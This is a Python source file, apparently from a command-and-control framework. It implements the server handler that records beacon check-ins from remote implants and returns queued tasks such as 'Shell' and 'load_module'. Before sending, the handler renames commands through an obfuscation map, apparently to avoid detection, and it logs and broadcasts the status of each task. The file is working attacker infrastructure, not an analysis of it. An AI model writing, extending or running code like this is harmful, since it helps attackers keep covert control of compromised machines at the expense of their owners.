import json
import time
from http.server import BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

import colorama

# WebSocket broadcasts for live UI updates
from Modules.beacon.beacon_server.websocket_server import (
    publish_beacon_update,
    publish_command_update,
    publish_event,
)
from Modules.global_objects import beacon_list, command_list, logger, obfuscation_map
from Modules.utils.ui_manager import (
    log_beacon_checkin,
    log_command,
    update_connection_stats,
)


def handle_beacon_call_in(handler: BaseHTTPRequestHandler, match: dict):
    """
    Handles beacon call-ins, updating beacon status and sending commands.
    Args:
        handler (BaseHTTPRequestHandler): The HTTP request handler
        match (dict): Regex match object for the request path
    Returns:
        None
    """
    from Modules.global_objects import sessions_list

    logger.info(f"Beacon call-in from {handler.path}")

    query_components = parse_qs(urlparse(handler.path).query)
    beacon_id = query_components.get("session", [None])[0]

    if not beacon_id:
        logger.error("No session ID provided in beacon call-in.")
        handler.send_response(400)
        handler.end_headers()
        return

    beacon = beacon_list.get(beacon_id)
    if not beacon:
        logger.error(f"Beacon with ID {beacon_id} not found.")
        handler.send_response(404)
        handler.end_headers()
        return

    # Update beacon timestamps and notify UI
    current_time = time.time()
    beacon.last_beacon = time.asctime()
    beacon.next_beacon = time.asctime(time.localtime(current_time + beacon.timer))
    logger.info(f"Beacon {beacon_id} updated. Next check-in: {beacon.next_beacon}")
    # Broadcast per-beacon update over WebSocket
    publish_beacon_update(
        beacon_id,
        {
            "type": "beacon_checkin",
            "uuid": beacon_id,
            "hostname": getattr(beacon, "hostname", None),
            "next_beacon": beacon.next_beacon,
        },
    )

    # Update database with last_seen timestamp
    if beacon.database:
        try:
            beacon.database.update_entry(
                "connections",
                "last_seen=?, next_beacon=?",
                (current_time, current_time + beacon.timer),
                "uuid=?",
                (beacon_id,),
            )
            logger.debug(f"Updated last_seen for beacon {beacon_id} in database")
        except Exception as e:
            logger.error(f"Failed to update beacon last_seen in database: {e}")

    # Log beacon check-in to live events feed
    update_connection_stats(len(sessions_list), len(beacon_list))
    # Broadcast global connection stats to the events stream
    publish_event(
        {
            "type": "connection_stats",
            "sessions": len(sessions_list),
            "beacons": len(beacon_list),
        }
    )

    # Check for commands to send
    commands_to_send = []
    # Safely get commands mapping from obfuscation_map
    command_obf = obfuscation_map.get("generic", {}).get("commands", {})
    # Create a snapshot of the command list to avoid "dictionary changed size during iteration" error
    command_items = list(command_list.items())
    for cmd_id, command in command_items:
        if command.beacon_uuid == beacon_id and not command.executed:
            command.output = "Sent to beacon, waiting for response."
            obfuscated_command = None
            try:
                # Try top-level lookup case-insensitively
                obf_entry = obfuscation_map.get(command.command) or obfuscation_map.get(
                    command.command.lower()
                )
                if obf_entry is None:
                    generic_commands = obfuscation_map.get("generic", {}).get(
                        "commands", {}
                    )
                    obf_entry = generic_commands.get(
                        command.command
                    ) or generic_commands.get(command.command.lower())
                if isinstance(obf_entry, dict):
                    obfuscated_command = obf_entry.get(
                        "obfuscation_name"
                    ) or obf_entry.get("module_name")
                    if obfuscated_command is None:
                        logger.error(
                            f"Obfuscation entry for command '{command.command}' missing expected name keys"
                        )
                        continue
                elif isinstance(obf_entry, str):
                    obfuscated_command = obf_entry
                else:
                    logger.error(
                        f"Obfuscation entry for command '{command.command}' is missing or has unexpected type: {type(obf_entry)}"
                    )
                    continue
            except Exception as e:
                logger.error(f"Error obfuscating command '{command.command}': {e}")
                continue
            commands_to_send.append(
                {
                    command_obf.get("command_uuid"): cmd_id,
                    command_obf.get("command"): obfuscated_command,
                    command_obf.get("data"): getattr(command, "command_data", None),
                }
            )
            command.executed = True

            # Update database status to "Received" when beacon picks up the command
            if beacon.database:
                try:
                    beacon.database.update_entry(
                        "beacon_commands",
                        "command_output=?",
                        ("Received",),
                        "command_uuid=?",
                        (cmd_id,),
                    )
                    logger.info(
                        f"Command {cmd_id} ({command.command}) picked up by beacon {beacon_id}"
                    )

                    # Log command pickup to live events feed
                    display_cmd = command.command
                    try:
                        if command.command == "load_module":
                            cmd_data = getattr(command, "command_data", None)
                            if isinstance(cmd_data, dict):
                                mod_name = cmd_data.get("name") or cmd_data.get(
                                    "module_name"
                                )
                                if mod_name:
                                    display_cmd = f"load_module {mod_name}"
                    except Exception:
                        pass
                    log_command(display_cmd, beacon.hostname, "sent")
                    # Broadcast command lifecycle update over WebSocket
                    publish_command_update(
                        {
                            "type": "command",
                            "uuid": cmd_id,
                            "state": "sent",
                            "command": display_cmd,
                            "target": beacon.hostname,
                        }
                    )
                except Exception as e:
                    logger.error(f"Failed to update command status to 'Received': {e}")

        if command.command == "Module":
            command.data = "Module Sent"
        if command.command == "Shell":
            command.data = "Shell Sent"

    none_key = command_obf.get("none").get("obfuscation_name")
    response_data = (
        {command_obf.get("obfuscation_name"): commands_to_send}
        if commands_to_send
        else {none_key: none_key}
    )
    response_body = json.dumps(response_data).encode("utf-8")

    handler.send_response(200)
    handler.send_header("Content-Type", "application/json")
    handler.send_header("Content-Length", str(len(response_body)))
    handler.end_headers()
    handler.wfile.write(response_body)
